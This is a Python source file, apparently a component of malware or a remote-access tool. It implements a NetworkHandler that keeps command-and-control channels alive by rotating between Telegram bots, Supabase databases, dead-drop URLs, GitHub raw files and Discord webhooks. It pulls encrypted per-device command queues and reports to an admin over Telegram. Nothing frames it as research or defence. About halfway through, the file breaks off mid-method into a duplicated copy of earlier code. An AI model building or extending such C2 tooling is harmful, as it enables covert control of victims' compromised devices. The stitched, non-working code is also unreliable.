#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import time
import logging
import requests
import json
import base64
import telebot
from supabase import create_client
from typing import Optional, Dict, List, Any
import os

class NetworkHandler:
    def __init__(self, config: dict, crypto):
        self.crypto = crypto
        self.config = config
        self.telegram_tokens = config['telegram']['tokens']
        self.supabase_urls = config['supabase']['urls']
        self.supabase_keys = config['supabase']['keys']
        self.dead_drop_urls = config['dead_drop']['urls']
        self.github_raw_urls = config['github_raw']['urls']
        self.discord_webhooks = config.get('discord_webhooks', {}).get('urls', [])
        self.ai_c2 = config.get('ai_c2', {'enabled': False, 'endpoints': []})

        self.active_telegram = 0
        self.active_supabase = 0
        self.lock = threading.Lock()
        self.bots = [telebot.TeleBot(token) for token in self.telegram_tokens if token]
        self.supabase_clients = []
        for i in range(min(len(self.supabase_urls), len(self.supabase_keys))):
            if self.supabase_urls[i] and self.supabase_keys[i]:
                self.supabase_clients.append(create_client(self.supabase_urls[i], self.supabase_keys[i]))

    def get_active_telegram_token(self) -> Optional[str]:
        with self.lock:
            if self.bots and self.active_telegram < len(self.bots):
                return self.telegram_tokens[self.active_telegram]
            return None

    def get_active_supabase(self) -> Optional[Dict[str, str]]:
        with self.lock:
            if self.supabase_clients and self.active_supabase < len(self.supabase_clients):
                return {
                    'url': self.supabase_urls[self.active_supabase],
                    'key': self.supabase_keys[self.active_supabase]
                }
            return None

    def get_active_dead_drop(self) -> Optional[str]:
        with self.lock:
            if self.dead_drop_urls:
                return self.dead_drop_urls[0]
            return None

    def get_active_github_raw(self) -> Optional[str]:
        with self.lock:
            if self.github_raw_urls:
                return self.github_raw_urls[0]
            return None

    def rotate_telegram(self):
        with self.lock:
            if len(self.bots) > 1:
                self.active_telegram = (self.active_telegram + 1) % len(self.bots)
                logging.info(f"Switched to Telegram bot index {self.active_telegram}")

    def rotate_supabase(self):
        with self.lock:
            if len(self.supabase_clients) > 1:
                self.active_supabase = (self.active_supabase + 1) % len(self.supabase_clients)
                logging.info(f"Switched to Supabase index {self.active_supabase}")

    def rotate_dead_drop(self):
        with self.lock:
            if len(self.dead_drop_urls) > 1:
                self.dead_drop_urls.append(self.dead_drop_urls.pop(0))
                logging.info("Switched to next Dead Drop")

    def rotate_github_raw(self):
        with self.lock:
            if len(self.github_raw_urls) > 1:
                self.github_raw_urls.append(self.github_raw_urls.pop(0))
                logging.info("Switched to next GitHub raw")

    def test_telegram_token(self, token: str) -> bool:
        try:
            url = f"https://api.telegram.org/bot{token}/getMe"
            r = requests.get(url, timeout=10)
            return r.status_code == 200
        except Exception:
            return False

    def test_supabase(self, url: str, key: str) -> bool:
        try:
            headers = {"apikey": key, "Authorization": f"Bearer {key}"}
            r = requests.get(f"{url}/rest/v1/registered_devices?select=client_serial&limit=1", headers=headers, timeout=10)
            return r.status_code == 200
        except Exception:
            return False

    def test_url(self, url: str) -> bool:
        try:
            r = requests.get(url, timeout=10)
            return r.status_code < 500
        except Exception:
            return False

    def check_all_connections(self) -> Dict[str, bool]:
        status = {}
        current_tg = self.get_active_telegram_token()
        if current_tg:
            if not self.test_telegram_token(current_tg):
                self.rotate_telegram()
                status['telegram'] = False
            else:
                status['telegram'] = True

        current_sup = self.get_active_supabase()
        if current_sup:
            if not self.test_supabase(current_sup['url'], current_sup['key']):
                self.rotate_supabase()
                status['supabase'] = False
            else:
                status['supabase'] = True

        current_dd = self.get_active_dead_drop()
        if current_dd:
            if not self.test_url(current_dd):
                self.rotate_dead_drop()
                status['dead_drop'] = False
            else:
                status['dead_drop'] = True

        current_gh = self.get_active_github_raw()
        if current_gh:
            if not self.test_url(current_gh):
                self.rotate_github_raw()
                status['github_raw'] = False
            else:
                status['github_raw'] = True

        return status

    def fetch_pending_commands(self, device_id: str, supabase_client=None) -> List[Dict]:
        commands = []
        if supabase_client:
            try:
                resp = supabase_client.table('task_queue') \
                    .select('*') \
                    .eq('target_client', device_id) \
                    .eq('ticket_status', 'open') \
                    .execute()
                commands.extend(resp.data)
                for cmd in resp.data:
                    supabase_client.table('task_queue') \
                        .update({'ticket_status': 'processing'}) \
                        .eq('ticket_id', cmd['ticket_id']) \
                        .execute()
            except Exception as e:
                logging.error(f"Failed to fetch commands from Supabase: {e}")

        dd_url = self.get_active_dead_drop()
        if dd_url:
            try:
                full_url = f"{dd_url.rstrip('/')}/{device_id}.json"
                r = requests.get(full_url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, dict) and 'encrypted' in data and self.crypto:
                        encrypted = base64.b64decode(data['encrypted'])
                        decrypted = self.crypto.decrypt_stored_key(encrypted)
                        data = json.loads(decrypted)
                    if isinstance(data, list):
                        commands.extend(data)
            except Exception as e:
                logging.error(f"Failed to fetch from Dead Drop: {e}")

        gh_url = self.get_active_github_raw()
        if gh_url:
            try:
                full_url = f"{gh_url.rstrip('/')}/{device_id}.json"
                r = requests.get(full_url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, list):
                        commands.extend(data)
            except Exception as e:
                logging.error(f"Failed to fetch from GitHub raw: {e}")

        return commands

    def send_message_to_admin(self, text: str):
        max_attempts = len(self.bots) * 2
        admin_id = int(os.environ.get('ADMIN_ID', 0))
        if admin_id == 0:
            logging.error("ADMIN_ID not set")
            return
        for attempt in range(max_attempts):
            idx = (self.active_telegram + attempt) % len(self.bots) if self.bots else -1
            if idx == -1:
                logging.error("No Telegram bots available")
                return
            try:
                self.bots[idx].send_message(admin_id, text, parse_mode='Markdown')
                self.active_telegram = idx
                return
            except Exception as e:
                logging.warning(f"Bot {idx} failed: {e}")
        logging.error("All Telegram bots failed to send message")

    def get_active_config(self) -> Dict[str, Any]:
        return {
            'telegram': {
                'primary': self.get_active_telegram_token(),
                'backups': [t for i, t in enumerate(self.telegram_tokens) if i != self.active_telegram]
            },
            'supabase': self.get_active_supabase(),
            'dead_drop': self.get_active_dead_drop(),
            'github_raw': self.get_active_github_raw(),
            'commands_interval': 60,
            'heartbeat_interval': 300,
            'failover_retry': 30
        }        if current_sup:
            if not self.test_supabase(current_sup['url'], current_sup['key']):
                self.rotate_supabase()
                status['supabase'] = False
            else:
                status['supabase'] = True

        current_dd = self.get_active_dead_drop()
        if current_dd:
            if not self.test_url(current_dd):
                self.rotate_dead_drop()
                status['dead_drop'] = False
            else:
                status['dead_drop'] = True

        current_gh = self.get_active_github_raw()
        if current_gh:
            if not self.test_url(current_gh):
                self.rotate_github_raw()
                status['github_raw'] = False
            else:
                status['github_raw'] = True

        return status

    def fetch_pending_commands(self, device_id: str, supabase_client=None) -> List[Dict]:
        commands = []
        if supabase_client:
            try:
                resp = supabase_client.table('task_queue') \
                    .select('*') \
                    .eq('target_client', device_id) \
                    .eq('ticket_status', 'open') \
                    .execute()
                commands.extend(resp.data)
                for cmd in resp.data:
                    supabase_client.table('task_queue') \
                        .update({'ticket_status': 'processing'}) \
                        .eq('ticket_id', cmd['ticket_id']) \
                        .execute()
            except Exception as e:
                logging.error(f"Failed to fetch commands from Supabase: {e}")

        dd_url = self.get_active_dead_drop()
        if dd_url:
            try:
                full_url = f"{dd_url.rstrip('/')}/{device_id}.json"
                r = requests.get(full_url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, dict) and 'encrypted' in data and self.crypto:
                        encrypted = base64.b64decode(data['encrypted'])
                        decrypted = self.crypto.decrypt_stored_key(encrypted)
                        data = json.loads(decrypted)
                    if isinstance(data, list):
                        commands.extend(data)
            except Exception as e:
                logging.error(f"Failed to fetch from Dead Drop: {e}")

        gh_url = self.get_active_github_raw()
        if gh_url:
            try:
                full_url = f"{gh_url.rstrip('/')}/{device_id}.json"
                r = requests.get(full_url, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, list):
                        commands.extend(data)
            except Exception as e:
                logging.error(f"Failed to fetch from GitHub raw: {e}")

        return commands

    def send_message_to_admin(self, text: str):
        max_attempts = len(self.bots) * 2
        admin_id = int(os.environ.get('ADMIN_ID', 0))
        if admin_id == 0:
            logging.error("ADMIN_ID not set")
            return
        for attempt in range(max_attempts):
            idx = (self.active_telegram + attempt) % len(self.bots) if self.bots else -1
            if idx == -1:
                logging.error("No Telegram bots available")
                return
            try:
                self.bots[idx].send_message(admin_id, text, parse_mode='Markdown')
                self.active_telegram = idx
                return
            except Exception as e:
                logging.warning(f"Bot {idx} failed: {e}")
        logging.error("All Telegram bots failed to send message")

    def get_active_config(self) -> Dict[str, Any]:
        return {
            'telegram': {
                'primary': self.get_active_telegram_token(),
                'backups': [t for i, t in enumerate(self.telegram_tokens) if i != self.active_telegram]
            },
            'supabase': self.get_active_supabase(),
            'dead_drop': self.get_active_dead_drop(),
            'github_raw': self.get_active_github_raw(),
            'commands_interval': 60,
            'heartbeat_interval': 300,
            'failover_retry': 30
                }
